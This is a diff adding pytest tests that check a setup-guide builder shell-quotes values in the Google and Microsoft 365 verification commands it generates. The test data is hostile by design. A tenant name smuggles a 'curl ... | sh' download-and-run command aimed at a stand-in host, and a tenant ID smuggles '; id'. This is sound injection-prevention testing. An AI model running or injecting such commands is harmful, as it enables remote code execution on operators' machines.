@@ -370,3 +370,38 @@ def test_reader_app_guide_check_command_reaches_the_certificate_check(tmp_path, 
     assert rc == 2
     assert "The certificate key file could not be used" in caplog.text
     assert not (tmp_path / "audit-output").exists()
+
+
+# R097: values are shell-quoted in the verification commands, so a path with a space stays one argument and a value
+# carrying shell syntax cannot add a pipeline to a command the operator pastes.
+INJECTED = "acme; curl -s https://x.example/p | sh"
+
+
+@pytest.mark.parametrize("auth", ["domain-delegation", "oauth"])
+def test_google_commands_quote_every_value(auth: str) -> None:
+    guide = build_setup_guide(
+        provider="google", auth=auth, tenant_name=INJECTED, service_account_key="/data/My Keys/sa.json",
+        oauth_client="/data/My Keys/client.json", token_cache="cache dir/token.json", subject="a b@example.com",
+        domain="example.com", customer_id="C0 1",
+    )
+    for name, command in guide["commands"].items():
+        argv = shlex.split(command)
+        assert not {"|", ";", "sh", "curl"} & set(argv), name
+        if name != "doctor":
+            assert argv[argv.index("--tenant-name") + 1] == INJECTED
+        if auth == "domain-delegation":
+            assert argv[argv.index("--service-account-key") + 1] == "/data/My Keys/sa.json"
+            assert argv[argv.index("--subject") + 1] == "a b@example.com"
+        else:
+            assert argv[argv.index("--oauth-client") + 1] == "/data/My Keys/client.json"
+            assert argv[argv.index("--token-cache") + 1] == "cache dir/token.json"
+        assert argv[argv.index("--customer-id") + 1] == "C0 1"
+
+
+def test_m365_commands_quote_every_value() -> None:
+    guide = build_setup_guide(provider="m365", tenant_name=INJECTED, tenant_id="contoso.onmicrosoft.com; id", collectors="identity")
+    for name, command in guide["commands"].items():
+        argv = shlex.split(command)
+        assert not {"|", ";", "sh", "curl", "id"} & set(argv), name
+        assert argv[argv.index("--tenant-name") + 1] == INJECTED
+        assert argv[argv.index("--tenant-id") + 1] == "contoso.onmicrosoft.com; id"
